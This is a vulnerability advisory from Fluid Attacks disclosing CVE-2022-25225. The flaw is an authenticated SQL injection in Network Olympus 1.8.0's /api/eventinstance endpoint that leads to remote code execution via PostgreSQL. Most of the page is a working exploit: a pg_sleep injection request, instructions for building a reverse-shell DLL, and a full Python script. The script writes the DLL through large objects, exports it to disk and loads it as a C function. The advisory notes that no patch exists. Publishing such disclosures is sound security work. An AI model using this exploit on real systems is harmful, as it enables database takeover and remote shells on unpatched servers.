---
slug: advisories/spinetta/
title: Network Olympus 1.8.0 - SQL Injection
authors: Oscar Uribe
writer: ouribe
codename: spinetta
product: Network Olympus 1.8.0
date: 2022-02-23 10:00 COT
cveid: CVE-2022-25225
description: Network Olympus 1.8.0 - SQL Injection
keywords: Fluid Attacks, Security, Vulnerabilities, Network Olympus
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                         |                                                                 |
|-------------------------|-----------------------------------------------------------------|
| **Name**                | Network Olympus 1.8.0 - SQL Injection                           |
| **Code name**           | [Spinetta](https://en.wikipedia.org/wiki/Luis_Alberto_Spinetta) |
| **Product**             | Network Olympus                                                 |
| **Affected versions**   | Version 1.8.0                                                   |
| **State**               | Public                                                          |
| **Release date**        | 2022-03-07                                                      |

## Vulnerability

|                       |                                                                  |
|-----------------------|------------------------------------------------------------------|
| **Kind**              | SQL injection                                                    |
| **Rule**              | [146. SQL injection](https://docs.fluidattacks.com/criteria/vulnerabilities/146)    |
| **Remote**            | Yes                                                              |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H                     |
| **CVSSv3 Base Score** | 9.1                                                              |
| **Exploit available** | No                                                               |
| **CVE ID(s)**         | [CVE-2022-25225](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25225)                                                     |

## Description

Network Olympus **version 1.8.0** allows an authenticated admin user to inject
SQL queries in `/api/eventinstance` via the `sqlparameter`. It is also possible
to achieve remote code execution in the default installation (PostgreSQL)
by exploiting this issue.

## Proof of Concept

Steps to reproduce

1. Log in to Network Olympus.

2. The application send a request to `/api/eventinstance`
   with a json as parameter in the url, the json parameter
   `sqlparameter` allows to inject sql queries. It can be
   exploited using boolean based sql or stacked queries.

3. The following PoC can be used to make the database sleep for 2 seconds.

    ```html
      /api/eventinstance/{"pagenumber":1,"itemsperpage":100,"order":"asc","sqlparameter":[],"sqlstring":"1=1%2f%2a%2a%2f;select%2f%2a%2a%2fpg_sleep(2);--"}
    ```

4. To achieve command execution it is possible to create a malicious
   DLL and then load it in postgresql.

5. Create a malicious postgres [DLL extension](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html).

6. Create a copy of the exploit found in the following session
   and copy the generated DLL to the same folder
   and rename it to `rev_shell.dll`.

System Information

* Version: Network Olympus 1.8.0 (Trial Version).
* Operating System: Windows 10.
* Database and version: PostgreSQL 10.8,
  compiled by Visual C++ build 1800, 32-bit.

## Exploit

```python
import requests,sys, urllib, string, random, time, binascii
requests.packages.urllib3.disable_warnings()


# encoded UDF rev_shell dll

def read_udf(filename='rev_shell.dll'):
    f = open(filename, 'rb')
    content = f.read()
    return  binascii.hexlify(content)


udf = read_udf()


def login():

    url = "http://172.16.28.140:3000/api/signIn"

    # CHANGE THIS
    json = {"password": "j84sTuh8pmLb2YhVTChcmg==", "username": "admin"}

    s = requests.session()
    s.post(url, json=json)

    return s

def log(msg):
    print(msg)

def make_request(url, sql,s):
    json_query = """{"pagenumber":1,"itemsperpage":100,"order":"asc","sqlparameter":[],"sqlstring":\""""

    sqli = "1=1; %s --" % sql

    sqli = sqli.replace(" ","%2f%2a%2a%2f")

    sqli = json_query + sqli + "\"}"

    log("[*] Executing query: %s" % sql[0:80])
    proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}
    r = s.get(url+sqli, verify=False, proxies=proxies)

    return r


def delete_lo(url, loid,s):
    log("[+] Deleting existing LO...")
    sql = "SELECT lo_unlink(%d)" % loid
    make_request(url, sql, s)


def create_lo(url, loid,s):
    log("[+] Creating LO for UDF injection...")
    sql = "SELECT lo_import('C:\\\\windows\\\\win.ini',%d)" % loid
    make_request(url, sql, s)


def inject_udf(url, loid,s):
    log("[+] Injecting payload of length %d into LO..." % len(udf))

    size = 2048 * 2

    for i in range(0,((len(udf)-1)/size)+1):
        udf_chunk = udf[i*size:(i+1)*size]

        if i == 0:
            sql = "UPDATE PG_LARGEOBJECT SET data=decode('%s', 'hex') where loid=%d and pageno=%d" % (udf_chunk, loid, i)
        else:
            sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d, decode('%s', 'hex'))" % (loid, i, udf_chunk)

        make_request(url, sql,s)

def export_udf(url, loid,s):
    log("[+] Exporting UDF library to filesystem...")
    sql = "SELECT lo_export(%d, 'C:\\\\Users\\\\Public\\\\rev_shell.dll')" % loid
    make_request(url, sql,s)

def create_udf_func(url,s):
    log("[+] Creating function...")
    #sql = "create or replace function rev_shell(text, integer) returns VOID as 'C:\\Users\\Public\\rev_shell.dll', 'connect_back' language C strict"
    sql = "CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS 'C:\\\\Users\\\\Public\\\\rev_shell.dll', 'dummy_function' LANGUAGE C STRICT;"
    make_request(url, sql,s)

if __name__ == '__main__':
    try:
        server = sys.argv[1].strip()
        port = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s serverIP:port " % sys.argv[0])
        sys.exit()

    sqli_url = "http://%s:%s/api/eventinstance/" % (server,port)

    loid = 1337

    print("[*] Authenticated SQL Injection to RCE")
    print("[*] Network Olympus 1.8.0 ")
    print

    s = login()

    delete_lo(sqli_url, loid,s)
    create_lo(sqli_url, loid,s)
    inject_udf(sqli_url, loid,s)
    export_udf(sqli_url, loid,s)
    create_udf_func(sqli_url,s)
```

## Mitigation

By 2022-03-07 there is not a patch resolving the issue.

## Credits

The vulnerability was discovered by [Oscar
Uribe](https://co.linkedin.com/in/oscar-uribe-londo%C3%B1o-0b6534155) from the Offensive
Team of  `Fluid Attacks`.

## References

|                     |                                                                     |
|---------------------|---------------------------------------------------------------------|
| **Vendor page**     | <https://www.network-olympus.com/monitoring/>                       |

## Timeline

* 2022-02-22: Vulnerability discovered.

* 2022-02-23: Vendor contacted.

* 2022-03-07: Public Disclosure.